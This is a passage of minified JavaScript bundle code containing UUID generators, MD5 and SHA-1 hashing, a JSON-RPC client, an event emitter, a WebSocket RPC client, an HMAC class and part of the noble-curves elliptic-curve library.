p=l/4294967296*1e4&268435455;i[r++]=p>>>8&255,i[r++]=p&255,i[r++]=p>>>24&15|16,i[r++]=p>>>16&255,i[r++]=o>>>8|128,i[r++]=o&255;for(var w=0;w<6;++w)i[r+w]=s[w];return e||Mp(i)}function Kb(n){if(!Rp(n))throw TypeError("Invalid UUID");var e,t=new Uint8Array(16);return t[0]=(e=parseInt(n.slice(0,8),16))>>>24,t[1]=e>>>16&255,t[2]=e>>>8&255,t[3]=e&255,t[4]=(e=parseInt(n.slice(9,13),16))>>>8,t[5]=e&255,t[6]=(e=parseInt(n.slice(14,18),16))>>>8,t[7]=e&255,t[8]=(e=parseInt(n.slice(19,23),16))>>>8,t[9]=e&255,t[10]=(e=parseInt(n.slice(24,36),16))/1099511627776&255,t[11]=e/4294967296&255,t[12]=e>>>24&255,t[13]=e>>>16&255,t[14]=e>>>8&255,t[15]=e&255,t}function JL(n){n=unescape(encodeURIComponent(n));for(var e=[],t=0;t<n.length;++t)e.push(n.charCodeAt(t));return e}var XL="6ba7b810-9dad-11d1-80b4-00c04fd430c8",eD="6ba7b811-9dad-11d1-80b4-00c04fd430c8";function Gb(n,e,t){function r(i,s,o,a){if(typeof i=="string"&&(i=JL(i)),typeof s=="string"&&(s=Kb(s)),s.length!==16)throw TypeError("Namespace must be array-like (16 iterable integer values, 0-255)");var l=new Uint8Array(16+i.length);if(l.set(s),l.set(i,s.length),l=t(l),l[6]=l[6]&15|e,l[8]=l[8]&63|128,o){a=a||0;for(var u=0;u<16;++u)o[a+u]=l[u];return o}return Mp(l)}try{r.name=n}catch{}return r.DNS=XL,r.URL=eD,r}function tD(n){if(typeof n=="string"){var e=unescape(encodeURIComponent(n));n=new Uint8Array(e.length);for(var t=0;t<e.length;++t)n[t]=e.charCodeAt(t)}return nD(rD(iD(n),n.length*8))}function nD(n){for(var e=[],t=n.length*32,r="0123456789abcdef",i=0;i<t;i+=8){var s=n[i>>5]>>>i%32&255,o=parseInt(r.charAt(s>>>4&15)+r.charAt(s&15),16);e.push(o)}return e}function Qb(n){return(n+64>>>9<<4)+14+1}function rD(n,e){n[e>>5]|=128<<e%32,n[Qb(e)-1]=e;for(var t=1732584193,r=-271733879,i=-1732584194,s=271733878,o=0;o<n.length;o+=16){var a=t,l=r,u=i,h=s;t=qn(t,r,i,s,n[o],7,-680876936),s=qn(s,t,r,i,n[o+1],12,-389564586),i=qn(i,s,t,r,n[o+2],17,606105819),r=qn(r,i,s,t,n[o+3],22,-1044525330),t=qn(t,r,i,s,n[o+4],7,-176418897),s=qn(s,t,r,i,n[o+5],12,1200080426),i=qn(i,s,t,r,n[o+6],17,-1473231341),r=qn(r,i,s,t,n[o+7],22,-45705983),t=qn(t,r,i,s,n[o+8],7,1770035416),s=qn(s,t,r,i,n[o+9],12,-1958414417),i=qn(i,s,t,r,n[o+10],17,-42063),r=qn(r,i,s,t,n[o+11],22,-1990404162),t=qn(t,r,i,s,n[o+12],7,1804603682),s=qn(s,t,r,i,n[o+13],12,-40341101),i=qn(i,s,t,r,n[o+14],17,-1502002290),r=qn(r,i,s,t,n[o+15],22,1236535329),t=Kn(t,r,i,s,n[o+1],5,-165796510),s=Kn(s,t,r,i,n[o+6],9,-1069501632),i=Kn(i,s,t,r,n[o+11],14,643717713),r=Kn(r,i,s,t,n[o],20,-373897302),t=Kn(t,r,i,s,n[o+5],5,-701558691),s=Kn(s,t,r,i,n[o+10],9,38016083),i=Kn(i,s,t,r,n[o+15],14,-660478335),r=Kn(r,i,s,t,n[o+4],20,-405537848),t=Kn(t,r,i,s,n[o+9],5,568446438),s=Kn(s,t,r,i,n[o+14],9,-1019803690),i=Kn(i,s,t,r,n[o+3],14,-187363961),r=Kn(r,i,s,t,n[o+8],20,1163531501),t=Kn(t,r,i,s,n[o+13],5,-1444681467),s=Kn(s,t,r,i,n[o+2],9,-51403784),i=Kn(i,s,t,r,n[o+7],14,1735328473),r=Kn(r,i,s,t,n[o+12],20,-1926607734),t=Gn(t,r,i,s,n[o+5],4,-378558),s=Gn(s,t,r,i,n[o+8],11,-2022574463),i=Gn(i,s,t,r,n[o+11],16,1839030562),r=Gn(r,i,s,t,n[o+14],23,-35309556),t=Gn(t,r,i,s,n[o+1],4,-1530992060),s=Gn(s,t,r,i,n[o+4],11,1272893353),i=Gn(i,s,t,r,n[o+7],16,-155497632),r=Gn(r,i,s,t,n[o+10],23,-1094730640),t=Gn(t,r,i,s,n[o+13],4,681279174),s=Gn(s,t,r,i,n[o],11,-358537222),i=Gn(i,s,t,r,n[o+3],16,-722521979),r=Gn(r,i,s,t,n[o+6],23,76029189),t=Gn(t,r,i,s,n[o+9],4,-640364487),s=Gn(s,t,r,i,n[o+12],11,-421815835),i=Gn(i,s,t,r,n[o+15],16,530742520),r=Gn(r,i,s,t,n[o+2],23,-995338651),t=Qn(t,r,i,s,n[o],6,-198630844),s=Qn(s,t,r,i,n[o+7],10,1126891415),i=Qn(i,s,t,r,n[o+14],15,-1416354905),r=Qn(r,i,s,t,n[o+5],21,-57434055),t=Qn(t,r,i,s,n[o+12],6,1700485571),s=Qn(s,t,r,i,n[o+3],10,-1894986606),i=Qn(i,s,t,r,n[o+10],15,-1051523),r=Qn(r,i,s,t,n[o+1],21,-2054922799),t=Qn(t,r,i,s,n[o+8],6,1873313359),s=Qn(s,t,r,i,n[o+15],10,-30611744),i=Qn(i,s,t,r,n[o+6],15,-1560198380),r=Qn(r,i,s,t,n[o+13],21,1309151649),t=Qn(t,r,i,s,n[o+4],6,-145523070),s=Qn(s,t,r,i,n[o+11],10,-1120210379),i=Qn(i,s,t,r,n[o+2],15,718787259),r=Qn(r,i,s,t,n[o+9],21,-343485551),t=Hs(t,a),r=Hs(r,l),i=Hs(i,u),s=Hs(s,h)}return[t,r,i,s]}function iD(n){if(n.length===0)return[];for(var e=n.length*8,t=new Uint32Array(Qb(e)),r=0;r<e;r+=8)t[r>>5]|=(n[r/8]&255)<<r%32;return t}function Hs(n,e){var t=(n&65535)+(e&65535),r=(n>>16)+(e>>16)+(t>>16);return r<<16|t&65535}function sD(n,e){return n<<e|n>>>32-e}function Np(n,e,t,r,i,s){return Hs(sD(Hs(Hs(e,n),Hs(r,s)),i),t)}function qn(n,e,t,r,i,s,o){return Np(e&t|~e&r,n,e,i,s,o)}function Kn(n,e,t,r,i,s,o){return Np(e&r|t&~r,n,e,i,s,o)}function Gn(n,e,t,r,i,s,o){return Np(e^t^r,n,e,i,s,o)}function Qn(n,e,t,r,i,s,o){return Np(t^(e|~r),n,e,i,s,o)}var oD=Gb("v3",48,tD);const aD=oD;function lD(n,e,t){n=n||{};var r=n.random||(n.rng||qb)();if(r[6]=r[6]&15|64,r[8]=r[8]&63|128,e){t=t||0;for(var i=0;i<16;++i)e[t+i]=r[i];return e}return Mp(r)}function cD(n,e,t,r){switch(n){case 0:return e&t^~e&r;case 1:return e^t^r;case 2:return e&t^e&r^t&r;case 3:return e^t^r}}function om(n,e){return n<<e|n>>>32-e}function uD(n){var e=[1518500249,1859775393,2400959708,3395469782],t=[1732584193,4023233417,2562383102,271733878,3285377520];if(typeof n=="string"){var r=unescape(encodeURIComponent(n));n=[];for(var i=0;i<r.length;++i)n.push(r.charCodeAt(i))}else Array.isArray(n)||(n=Array.prototype.slice.call(n));n.push(128);for(var s=n.length/4+2,o=Math.ceil(s/16),a=new Array(o),l=0;l<o;++l){for(var u=new Uint32Array(16),h=0;h<16;++h)u[h]=n[l*64+h*4]<<24|n[l*64+h*4+1]<<16|n[l*64+h*4+2]<<8|n[l*64+h*4+3];a[l]=u}a[o-1][14]=(n.length-1)*8/Math.pow(2,32),a[o-1][14]=Math.floor(a[o-1][14]),a[o-1][15]=(n.length-1)*8&4294967295;for(var f=0;f<o;++f){for(var p=new Uint32Array(80),w=0;w<16;++w)p[w]=a[f][w];for(var x=16;x<80;++x)p[x]=om(p[x-3]^p[x-8]^p[x-14]^p[x-16],1);for(var k=t[0],I=t[1],A=t[2],b=t[3],E=t[4],O=0;O<80;++O){var W=Math.floor(O/20),q=om(k,5)+cD(W,I,A,b)+E+e[W]+p[O]>>>0;E=b,b=A,A=om(I,30)>>>0,I=k,k=q}t[0]=t[0]+k>>>0,t[1]=t[1]+I>>>0,t[2]=t[2]+A>>>0,t[3]=t[3]+b>>>0,t[4]=t[4]+E>>>0}return[t[0]>>24&255,t[0]>>16&255,t[0]>>8&255,t[0]&255,t[1]>>24&255,t[1]>>16&255,t[1]>>8&255,t[1]&255,t[2]>>24&255,t[2]>>16&255,t[2]>>8&255,t[2]&255,t[3]>>24&255,t[3]>>16&255,t[3]>>8&255,t[3]&255,t[4]>>24&255,t[4]>>16&255,t[4]>>8&255,t[4]&255]}var hD=Gb("v5",80,uD);const fD=hD,dD="00000000-0000-0000-0000-000000000000";function pD(n){if(!Rp(n))throw TypeError("Invalid UUID");return parseInt(n.substr(14,1),16)}const gD=Object.freeze(Object.defineProperty({__proto__:null,NIL:dD,parse:Kb,stringify:Mp,v1:ZL,v3:aD,v4:lD,v5:fD,validate:Rp,version:pD},Symbol.toStringTag,{value:"Module"})),Yb=zy(gD),mD=Yb.v4,yD=function(n,e,t,r){if(typeof n!="string")throw new TypeError(n+" must be a string");r=r||{};const i=typeof r.version=="number"?r.version:2;if(i!==1&&i!==2)throw new TypeError(i+" must be 1 or 2");const s={method:n};if(i===2&&(s.jsonrpc="2.0"),e){if(typeof e!="object"&&!Array.isArray(e))throw new TypeError(e+" must be an object, array or omitted");s.params=e}if(typeof t>"u"){const o=typeof r.generator=="function"?r.generator:function(){return mD()};s.id=o(s,r)}else i===2&&t===null?r.notificationIdNull&&(s.id=null):s.id=t;return s};var wD=yD;const vD=Yb.v4,_D=wD,Vu=function(n,e){if(!(this instanceof Vu))return new Vu(n,e);e||(e={}),this.options={reviver:typeof e.reviver<"u"?e.reviver:null,replacer:typeof e.replacer<"u"?e.replacer:null,generator:typeof e.generator<"u"?e.generator:function(){return vD()},version:typeof e.version<"u"?e.version:2,notificationIdNull:typeof e.notificationIdNull=="boolean"?e.notificationIdNull:!1},this.callServer=n};var ED=Vu;Vu.prototype.request=function(n,e,t,r){const i=this;let s=null;const o=Array.isArray(n)&&typeof e=="function";if(this.options.version===1&&o)throw new TypeError("JSON-RPC 1.0 does not support batching");if(o||!o&&n&&typeof n=="object"&&typeof e=="function")r=e,s=n;else{typeof t=="function"&&(r=t,t=void 0);const u=typeof r=="function";try{s=_D(n,e,t,{generator:this.options.generator,version:this.options.version,notificationIdNull:this.options.notificationIdNull})}catch(h){if(u)return r(h);throw h}if(!u)return s}let l;try{l=JSON.stringify(s,this.options.replacer)}catch(u){return r(u)}return this.callServer(l,function(u,h){i._parseResponse(u,h,r)}),s};Vu.prototype._parseResponse=function(n,e,t){if(n){t(n);return}if(!e)return t();let r;try{r=JSON.parse(e,this.options.reviver)}catch(i){return t(i)}if(t.length===3)if(Array.isArray(r)){const i=function(o){return typeof o.error<"u"},s=function(o){return!i(o)};return t(null,r.filter(i),r.filter(s))}else return t(null,r.error,r.result);t(null,r)};const ID=Eo(ED);var Zb={exports:{}};(function(n){var e=Object.prototype.hasOwnProperty,t="~";function r(){}Object.create&&(r.prototype=Object.create(null),new r().__proto__||(t=!1));function i(l,u,h){this.fn=l,this.context=u,this.once=h||!1}function s(l,u,h,f,p){if(typeof h!="function")throw new TypeError("The listener must be a function");var w=new i(h,f||l,p),x=t?t+u:u;return l._events[x]?l._events[x].fn?l._events[x]=[l._events[x],w]:l._events[x].push(w):(l._events[x]=w,l._eventsCount++),l}function o(l,u){--l._eventsCount===0?l._events=new r:delete l._events[u]}function a(){this._events=new r,this._eventsCount=0}a.prototype.eventNames=function(){var u=[],h,f;if(this._eventsCount===0)return u;for(f in h=this._events)e.call(h,f)&&u.push(t?f.slice(1):f);return Object.getOwnPropertySymbols?u.concat(Object.getOwnPropertySymbols(h)):u},a.prototype.listeners=function(u){var h=t?t+u:u,f=this._events[h];if(!f)return[];if(f.fn)return[f.fn];for(var p=0,w=f.length,x=new Array(w);p<w;p++)x[p]=f[p].fn;return x},a.prototype.listenerCount=function(u){var h=t?t+u:u,f=this._events[h];return f?f.fn?1:f.length:0},a.prototype.emit=function(u,h,f,p,w,x){var k=t?t+u:u;if(!this._events[k])return!1;var I=this._events[k],A=arguments.length,b,E;if(I.fn){switch(I.once&&this.removeListener(u,I.fn,void 0,!0),A){case 1:return I.fn.call(I.context),!0;case 2:return I.fn.call(I.context,h),!0;case 3:return I.fn.call(I.context,h,f),!0;case 4:return I.fn.call(I.context,h,f,p),!0;case 5:return I.fn.call(I.context,h,f,p,w),!0;case 6:return I.fn.call(I.context,h,f,p,w,x),!0}for(E=1,b=new Array(A-1);E<A;E++)b[E-1]=arguments[E];I.fn.apply(I.context,b)}else{var O=I.length,W;for(E=0;E<O;E++)switch(I[E].once&&this.removeListener(u,I[E].fn,void 0,!0),A){case 1:I[E].fn.call(I[E].context);break;case 2:I[E].fn.call(I[E].context,h);break;case 3:I[E].fn.call(I[E].context,h,f);break;case 4:I[E].fn.call(I[E].context,h,f,p);break;default:if(!b)for(W=1,b=new Array(A-1);W<A;W++)b[W-1]=arguments[W];I[E].fn.apply(I[E].context,b)}}return!0},a.prototype.on=function(u,h,f){return s(this,u,h,f,!1)},a.prototype.once=function(u,h,f){return s(this,u,h,f,!0)},a.prototype.removeListener=function(u,h,f,p){var w=t?t+u:u;if(!this._events[w])return this;if(!h)return o(this,w),this;var x=this._events[w];if(x.fn)x.fn===h&&(!p||x.once)&&(!f||x.context===f)&&o(this,w);else{for(var k=0,I=[],A=x.length;k<A;k++)(x[k].fn!==h||p&&!x[k].once||f&&x[k].context!==f)&&I.push(x[k]);I.length?this._events[w]=I.length===1?I[0]:I:o(this,w)}return this},a.prototype.removeAllListeners=function(u){var h;return u?(h=t?t+u:u,this._events[h]&&o(this,h)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=t,a.EventEmitter=a,n.exports=a})(Zb);var SD=Zb.exports;const Jb=Eo(SD);var TD=class extends Jb{constructor(e,t,r){super();_n(this,"socket");this.socket=new window.WebSocket(e,r),this.socket.onopen=()=>this.emit("open"),this.socket.onmessage=i=>this.emit("message",i.data),this.socket.onerror=i=>this.emit("error",i),this.socket.onclose=i=>{this.emit("close",i.code,i.reason)}}send(e,t,r){const i=r||t;try{this.socket.send(e),i()}catch(s){i(s)}}close(e,t){this.socket.close(e,t)}addEventListener(e,t,r){this.socket.addEventListener(e,t,r)}};function AD(n,e){return new TD(n,e)}var bD=class{encode(n){return JSON.stringify(n)}decode(n){return JSON.parse(n)}},xD=class extends Jb{constructor(e,t="ws://localhost:8080",{autoconnect:r=!0,reconnect:i=!0,reconnect_interval:s=1e3,max_reconnects:o=5,...a}={},l,u){super();_n(this,"address");_n(this,"rpc_id");_n(this,"queue");_n(this,"options");_n(this,"autoconnect");_n(this,"ready");_n(this,"reconnect");_n(this,"reconnect_timer_id");_n(this,"reconnect_interval");_n(this,"max_reconnects");_n(this,"rest_options");_n(this,"current_reconnects");_n(this,"generate_request_id");_n(this,"socket");_n(this,"webSocketFactory");_n(this,"dataPack");this.webSocketFactory=e,this.queue={},this.rpc_id=0,this.address=t,this.autoconnect=r,this.ready=!1,this.reconnect=i,this.reconnect_timer_id=void 0,this.reconnect_interval=s,this.max_reconnects=o,this.rest_options=a,this.current_reconnects=0,this.generate_request_id=l||(()=>typeof this.rpc_id=="number"?++this.rpc_id:Number(this.rpc_id)+1),u?this.dataPack=u:this.dataPack=new bD,this.autoconnect&&this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}connect(){this.socket||this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}call(e,t,r,i){return!i&&typeof r=="object"&&(i=r,r=null),new Promise((s,o)=>{if(!this.ready)return o(new Error("socket not ready"));const a=this.generate_request_id(e,t),l={jsonrpc:"2.0",method:e,params:t||void 0,id:a};this.socket.send(this.dataPack.encode(l),i,u=>{if(u)return o(u);this.queue[a]={promise:[s,o]},r&&(this.queue[a].timeout=setTimeout(()=>{delete this.queue[a],o(new Error("reply timeout"))},r))})})}async login(e){const t=await this.call("rpc.login",e);if(!t)throw new Error("authentication failed");return t}async listMethods(){return await this.call("__listMethods")}notify(e,t){return new Promise((r,i)=>{if(!this.ready)return i(new Error("socket not ready"));const s={jsonrpc:"2.0",method:e,params:t};this.socket.send(this.dataPack.encode(s),o=>{if(o)return i(o);r()})})}async subscribe(e){typeof e=="string"&&(e=[e]);const t=await this.call("rpc.on",e);if(typeof e=="string"&&t[e]!=="ok")throw new Error("Failed subscribing to an event '"+e+"' with: "+t[e]);return t}async unsubscribe(e){typeof e=="string"&&(e=[e]);const t=await this.call("rpc.off",e);if(typeof e=="string"&&t[e]!=="ok")throw new Error("Failed unsubscribing from an event with: "+t);return t}close(e,t){this.socket.close(e||1e3,t)}setAutoReconnect(e){this.reconnect=e}setReconnectInterval(e){this.reconnect_interval=e}setMaxReconnects(e){this.max_reconnects=e}_connect(e,t){clearTimeout(this.reconnect_timer_id),this.socket=this.webSocketFactory(e,t),this.socket.addEventListener("open",()=>{this.ready=!0,this.emit("open"),this.current_reconnects=0}),this.socket.addEventListener("message",({data:r})=>{r instanceof ArrayBuffer&&(r=ve.Buffer.from(r).toString());try{r=this.dataPack.decode(r)}catch{return}if(r.notification&&this.listeners(r.notification).length){if(!Object.keys(r.params).length)return this.emit(r.notification);const i=[r.notification];if(r.params.constructor===Object)i.push(r.params);else for(let s=0;s<r.params.length;s++)i.push(r.params[s]);return Promise.resolve().then(()=>{this.emit.apply(this,i)})}if(!this.queue[r.id])return r.method?Promise.resolve().then(()=>{this.emit(r.method,r==null?void 0:r.params)}):void 0;"error"in r=="result"in r&&this.queue[r.id].promise[1](new Error('Server response malformed. Response must include either "result" or "error", but not both.')),this.queue[r.id].timeout&&clearTimeout(this.queue[r.id].timeout),r.error?this.queue[r.id].promise[1](r.error):this.queue[r.id].promise[0](r.result),delete this.queue[r.id]}),this.socket.addEventListener("error",r=>this.emit("error",r)),this.socket.addEventListener("close",({code:r,reason:i})=>{this.ready&&setTimeout(()=>this.emit("close",r,i),0),this.ready=!1,this.socket=void 0,r!==1e3&&(this.current_reconnects++,this.reconnect&&(this.max_reconnects>this.current_reconnects||this.max_reconnects===0)&&(this.reconnect_timer_id=setTimeout(()=>this._connect(e,t),this.reconnect_interval)))})}};class Xb extends rb{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,WP(e);const r=Fw(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return Ed(this),this.iHash.update(e),this}digestInto(e){Ed(this),Ep(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const ex=(n,e,t)=>new Xb(n,e).update(t).digest();ex.create=(n,e)=>new Xb(n,e);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function _E(n){n.lowS!==void 0&&os("lowS",n.lowS),n.prehash!==void 0&&os("prehash",n.prehash)}function kD(n){const e=$w(n);ic(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:t,Fp:r,a:i}=e;if(t){if(!r.eql(i,r.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof t!="object"||typeof t.beta!="bigint"||typeof t.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:CD,hexToBytes:RD}=M4;class MD extends Error{constructor(e=""){super(e)}}const Ki={Err:MD,_tlv:{encode:(n,e)=>{const{Err:t}=Ki;if(n<0||n>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const r=e.length/2,i=cl(r);if(i.length/2&128)throw new t("tlv.encode: long form length too big");const s=r>127?cl(i.length/2|128):"";return cl(n)+s+i+e},decode(n,e){const{Err:t}=Ki;let r=0;if(n<0||n>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[r++]!==n)throw new t("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const l=i&127;if(!l)throw new t("tlv.decode(long): indefinite length not supported");if(l>4)throw new t("tlv.decode(long): byte length is too big");const u=e.subarray(r,r+l);if(u.length!==l)throw new t("tlv.decode: length bytes not complete");if(u[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const h of u)o=o<<8|h;if(r+=l,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(n){const{Err:e}=Ki;if(n<Qi)throw new e("integer: negative integers are not allowed");let t=cl(n);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(n){const{Err:e}=Ki;if(n[0]&128)throw new e("invalid signature integer: negative");if(n[0]===0&&!(n[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return CD(n)}},toSig(n){const{Err:e,_int:t,_tlv:r}=Ki,i=typeof n=="string"?RD(n):n;uh(i);const{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l}=r.decode(2,s),{v:u,l:h}=r.decode(2,l);if(h.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(u)}},hexFromSig(n){const{_tlv:e,_int:t}=Ki,r=e.encode(2,t.encode(n.r)),i=e.encode(2,t.encode(n.s)),s=r+i;return e.encode(48,s)}},Qi=BigInt(0),En=BigInt(1);BigInt(2);const EE=BigInt(3);BigInt(4);function ND(n){const e=kD(n),{Fp:t}=e,r=Ap(e.n,e.nBitLength),i=e.toBytes||((k,I,A)=>{const b=I.toAffine();return fa(Uint8Array.from([4]),t.toBytes(b.x),t.toBytes(b.y))}),s=e.fromBytes||(k=>{const I=k.subarray(1),A=t.fromBytes(I.subarray(0,t.BYTES)),b=t.fromBytes(I.subarray(t.BYTES,2*t.BYTES));return{x:A,y:b}});function o(k){const{a:I,b:A}=e,b=t.sqr(k),E=t.mul(b,k);return t.add(t.add(E,t.mul(k,I)),A)}if(!t.eql(t.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(k){return Tp(k,En,e.n)}function l(k){const{allowedPrivateKeyLengths:I,nByteLength:A,wrapPrivateKey:b,n:E}=e;if(I&&typeof k!="bigint"){if(ua(k)&&(k=ha(k)),typeof k!="string"||!I.includes(k.length))throw new Error("invalid private key");k=k.padStart(A*2,"0")}let O;try{O=typeof k=="bigint"?k:na(un("private key",k,A))}catch{throw new Error("invalid private key, expected hex or "+A+" bytes, got "+typeof k)}return b&&(O=Ut(O,E)),$r("private key",O,En,E),O}function u(k){if(!(k instanceof p))throw new Error("ProjectivePoint expected")}const h=ju((k,I)=>{const{px:A,py:b,pz:E}=k;if(t.eql(E,t.ONE))return{x:A,y:b};const O=k.is0();I==null&&(I=O?t.ONE:t.inv(E));const W=t.mul(A,I),q=t.mul(b,I),L=t.mul(E,I);if(O)return{x:t.ZERO,y:t.ZERO};if(!t.eql(L,t.ONE))throw new Error("invZ was invalid");return{x:W,y:q}}),f=ju(k=>{if(k.is0()){if(e.allowInfinityPoint&&!t.is0(k.py))return;throw new Error("bad point: ZERO")}const{x:I,y:A}=k.toAffine();if(!t.isValid(I)||!t.isValid(A))throw new Error("bad point: x or y not FE");const b=t.sqr(A),E=o(I);if(!t.eql(b,E))throw new Error("bad point: equation left != right");if(!k.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class p{constructor(I,A,b){if(this.px=I,this.py=A,this.pz=b,I==null||!t.isValid(I))throw new Error("x required");if(A==null||!t.isValid(A))throw new Error("y required");if(b==null||!t.isValid(b))throw new Error("z required");Object.freeze(this)}static fromAffine(I){const{x:A,y:b}=I||{};if(!I||!t.isValid(A)||!t.isValid(b))throw new Error("invalid affine point");if(I instanceof p)throw new Error("projective point not allowed");const E=O=>t.eql(O,t.ZERO);return E(A)&&E(b)?p.ZERO:new p(A,b,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(I){const A=t.invertBatch(I.map(b=>b.pz));return I.map((b,E)=>b.toAffine(A[E])).map(p.fromAffine)}static fromHex(I){const A=p.fromAffine(s(un("pointHex",I)));return A.assertValidity(),A}static fromPrivateKey(I){return p.BASE.multiply(l(I))}static msm(I,A){return mb(p,r,I,A)}_setWindowSize(I){x.setWindowSize(this,I)}assertValidity(){f(this)}hasEvenY(){const{y:I}=this.toAffine();if(t.isOdd)return!t.isOdd(I);throw new Error("Field doesn't support isOdd")}equals(I){u(I);const{px:A,py:b,pz:E}=this,{px:O,py:W,pz:q}=I,L=t.eql(t.mul(A,q),t.mul(O,E)),N=t.eql(t.mul(b,q),t.mul(W,E));return L&&N}negate(){return new p(this.px,t.neg(this.py),this.pz)}double(){const{a:I,b:A}=e,b=t.mul(A,EE),{px:E,py:O,pz:W}=this;let q=t.ZERO,L=t.ZERO,N=t.ZERO,B=t.mul(E,E),z=t.mul(O,O),$=t.mul(W,W),K=t.mul(E,O);return K=t.add(K,K),N=t.mul(E,W),N=t.add(N,N),q=t.mul(I,N),L=t.mul(b,$),L=t.add(q,L),q=t.sub(z,L),L=t.add(z,L),L=t.mul(q,L),q=t.mul(K,q),N=t.mul(b,N),$=t.mul(I,$),K=t.sub(B,$),K=t.mul(I,K),K=t.add(K,N),N=t.add(B,B),B=t.add(N,B),B=t.add(B,$),B=t.mul(B,K),L=t.add(L,B),$=t.mul(O,W),$=t.add($,$),B=t.mul($,K),q=t.sub(q,B),N=t.mul($,z),N=t.add(N,N),N=t.add(N,N),new p(q,L,N)}add(I){u(I);const{px:A,py:b,pz:E}=this,{px:O,py:W,pz:q}=I;let L=t.ZERO,N=t.ZERO,B=t.ZERO;const z=e.a,$=t.mul(e.b,EE);let K=t.mul(A,O),S=t.mul(b,W),d=t.mul(E,q),_=t.add(A,b),C=t.add(O,W);_=t.mul(_,C),C=t.add(K,S),_=t.sub(_,C),C=t.add(A,E);let M=t.add(O,q);return C=t.mul(C,M),M=t.add(K,d),C=t.sub(C,M),M=t.add(b,E),L=t.add(W,q),M=t.mul(M,L),L=t.add(S,d),M=t.sub(M,L),B=t.mul(z,C),L=t.mul($,d),B=t.add(L,B),L=t.sub(S,B),B=t.add(S,B),N=t.mul(L,B),S=t.add(K,K),S=t.add(S,K),d=t.mul(z,d),C=t.mul($,C),S=t.add(S,d),d=t.sub(K,d),d=t.mul(z,d),C=t.add(C,d),K=t.mul(S,C),N=t.add(N,K),K=t.mul(M,C),L=t.mul(_,L),L=t.sub(L,K),K=t.mul(_,S),B=t.mul(M,B),B=t.add(B,K),new p(L,N,B)}subtract(I){return this.add(I.negate())}is0(){return this.equals(p.ZERO)}wNAF(I){return x.wNAFCached(this,I,p.normalizeZ)}multiplyUnsafe(I){const{endo:A,n:b}=e;$r("scalar",I,Qi,b);const E=p.ZERO;if(I===Qi)return E;if(this.is0()||I===En)return this;if(!A||x.hasPrecomputes(this))return x.wNAFCachedUnsafe(this,I,p.normalizeZ);let{k1neg:O,k1:W,k2neg:q,k2:L}=A.splitScalar(I),N=E,B=E,z=this;for(;W>Qi||L>Qi;)W&En&&(N=N.add(z)),L&En&&(B=B.add(z)),z=z.double(),W>>=En,L>>=En;return O&&(N=N.negate()),q&&(B=B.negate()),B=new p(t.mul(B.px,A.beta),B.py,B.pz),N.add(B)}multiply(I){const{endo:A,n:b}=e;$r("scalar",I,En,b);let E,O;if(A){const{k1neg:W,k1:q,k2neg:L,k2:N}=A.splitScalar(I);let{p:B,f:z}=this.wNAF(q),{p:$,f:K}=this.wNAF(N);B=x.constTimeNegate(W,B),$=x.constTimeNegate(L,$),$=new p(t.mul($.px,A.beta),$.py,$.pz),E=B.add($),O=z.add(K)}else{const{p:W,f:q}=this.wNAF(I);E=W,O=q}return p.normalizeZ([E,O])[0]}multiplyAndAddUnsafe(I,A,b){const E=p.BASE,O=(q,L)=>L===Qi||L===En||!q.equals(E)?q.multiplyUnsafe(L):q.multiply(L),W=O(this,A).add(O(I,b));return W.is0()?void 0:W}toAffine(I){return h(this,I)}isTorsionFree(){const{h:I,isTorsionFree:A}=e;if(I===En)return!0;if(A)return A(p,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:I,clearCofactor:A}=e;return 